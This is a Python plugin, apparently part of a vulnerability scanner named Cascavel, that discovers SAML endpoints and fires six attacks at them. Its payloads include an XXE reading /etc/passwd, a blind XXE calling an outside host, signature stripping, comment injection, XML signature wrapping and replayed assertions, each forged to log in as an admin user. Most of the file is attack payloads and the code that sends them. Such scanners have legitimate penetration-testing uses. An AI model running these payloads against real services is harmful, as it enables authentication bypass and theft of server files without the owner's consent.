# plugins/saml_scanner.py — Cascavel 2026 Intelligence
import requests
import base64


SAML_ENDPOINTS = [
    "/saml/SSO", "/saml2/SSO", "/adfs/ls/", "/simplesaml/",
    "/auth/realms/master/protocol/saml", "/sso/saml",
    "/saml/metadata", "/saml2/metadata",
    "/FederationMetadata/2007-06/FederationMetadata.xml",
    "/saml/login", "/saml2/login", "/saml/acs", "/saml2/acs",
    "/auth/saml/callback", "/api/auth/saml",
]

# ──────────── SAML ATTACK PAYLOADS (2026 Expanded) ────────────
SAML_ATTACKS = {
    "XXE_IN_SAML": {
        "payload": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><saml>&xxe;</saml>',
        "detect": ["root:", "/bin/", "nobody"],
        "severity": "CRITICO",
    },
    "XXE_BLIND": {
        "payload": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://cascavel-test.com/xxe">%xxe;]><saml>test</saml>',
        "detect": [],
        "severity": "ALTO",
    },
    "SIGNATURE_STRIP": {
        "payload": '<samlp:Response><saml:Assertion><saml:Subject><saml:NameID>admin@target.com</saml:NameID></saml:Subject></saml:Assertion></samlp:Response>',
        "detect": ["dashboard", "admin", "welcome", "session"],
        "severity": "CRITICO",
    },
    "COMMENT_INJECTION": {
        "payload": '<saml:NameID>admin@target.com<!-->.evil.com</saml:NameID>',
        "detect": ["admin", "session", "token"],
        "severity": "CRITICO",
    },
    "XSW_ATTACK": {
        "payload": '<samlp:Response><saml:Assertion ID="evil"><saml:Subject><saml:NameID>admin@target.com</saml:NameID></saml:Subject></saml:Assertion><saml:Assertion ID="legit"><saml:Subject><saml:NameID>user@target.com</saml:NameID></saml:Subject></saml:Assertion></samlp:Response>',
        "detect": ["admin", "welcome"],
        "severity": "CRITICO",
    },
    "SAML_REPLAY": {
        "payload": '<samlp:Response IssueInstant="2020-01-01T00:00:00Z"><saml:Assertion><saml:Conditions NotBefore="2020-01-01T00:00:00Z" NotOnOrAfter="2020-01-01T01:00:00Z"/><saml:Subject><saml:NameID>admin@target.com</saml:NameID></saml:Subject></saml:Assertion></samlp:Response>',
        "detect": ["session", "token", "admin"],
        "severity": "ALTO",
    },
}


def _check_saml_endpoints(target):
    """Verifica quais endpoints SAML estão expostos."""
    vulns = []
    for endpoint in SAML_ENDPOINTS:
        try:
            resp = requests.get(f"http://{target}{endpoint}", timeout=8)
            if resp.status_code == 200 and any(k in resp.text.lower() for k in
                                                ["saml", "entityid", "singlesignonservice", "idp"]):
                vuln = {
                    "tipo": "SAML_ENDPOINT_EXPOSED", "endpoint": endpoint,
                    "severidade": "MEDIO",
                    "descricao": "Endpoint SAML exposto — metadata acessível",
                }
                # Check for certificate disclosure
                if "X509Certificate" in resp.text or "CERTIFICATE" in resp.text:
                    vuln["severidade"] = "ALTO"
                    vuln["descricao"] = "SAML metadata expõe certificado X.509!"
                    vuln["tipo"] = "SAML_CERT_DISCLOSED"
                vulns.append(vuln)
        except Exception:
            continue
    return vulns


def _test_saml_attacks(target):
    """Testa ataques SAML avançados."""
    vulns = []
    test_endpoints = ["/saml/SSO", "/saml2/SSO", "/adfs/ls/", "/saml/acs",
                       "/saml2/acs", "/auth/saml/callback"]

    for attack_name, attack_data in SAML_ATTACKS.items():
        for endpoint in test_endpoints:
            try:
                # Base64-encoded SAMLResponse
                encoded = base64.b64encode(attack_data["payload"].encode()).decode()
                resp = requests.post(
                    f"http://{target}{endpoint}",
                    data={"SAMLResponse": encoded, "RelayState": "/"},
                    headers={"Content-Type": "application/x-www-form-urlencoded"},
                    timeout=8, allow_redirects=False,
                )

                # Check for XXE
                if attack_name.startswith("XXE") and any(d in resp.text for d in attack_data["detect"]):
                    vulns.append({
                        "tipo": "SAML_XXE", "endpoint": endpoint,
                        "severidade": "CRITICO",
                        "descricao": "XXE via SAML Response — file read confirmado!",
                    })

                # Check for auth bypass
                if attack_name in ("SIGNATURE_STRIP", "COMMENT_INJECTION", "XSW_ATTACK"):
                    if resp.status_code in (200, 302):
                        location = resp.headers.get("Location", "")
                        if any(d in location.lower() or d in resp.text.lower()
                               for d in attack_data["detect"]):
                            vulns.append({
                                "tipo": f"SAML_{attack_name}", "endpoint": endpoint,
                                "severidade": attack_data["severity"],
                                "descricao": f"SAML {attack_name} — auth bypass!",
                            })

                # Replay attack
                if attack_name == "SAML_REPLAY" and resp.status_code in (200, 302):
                    if "expired" not in resp.text.lower() and "invalid" not in resp.text.lower():
                        vulns.append({
                            "tipo": "SAML_REPLAY_ACCEPTED", "endpoint": endpoint,
                            "severidade": "ALTO",
                            "descricao": "SAML assertion com timestamp expirado aceita — replay attack!",
                        })

            except Exception:
                continue
    return vulns


def run(target, ip, open_ports, banners):
    """
    Scanner SAML Authentication Bypass 2026-Grade.

    Técnicas: 15 SAML endpoints, 6 attack types (XXE blind/file-read,
    signature stripping, comment injection, XML Signature Wrapping XSW,
    replay attack), certificate disclosure detection, metadata analysis,
    Base64 SAMLResponse encoding.
    """
    _ = (ip, open_ports, banners)
    vulns = []
    vulns.extend(_check_saml_endpoints(target))
    vulns.extend(_test_saml_attacks(target))

    return {
        "plugin": "saml_scanner",
        "versao": "2026.1",
        "tecnicas": ["xxe", "xxe_blind", "signature_strip", "comment_injection",
                      "xsw_attack", "replay_attack", "cert_disclosure"],
        "resultados": vulns if vulns else "Nenhuma falha SAML detectada",
    }
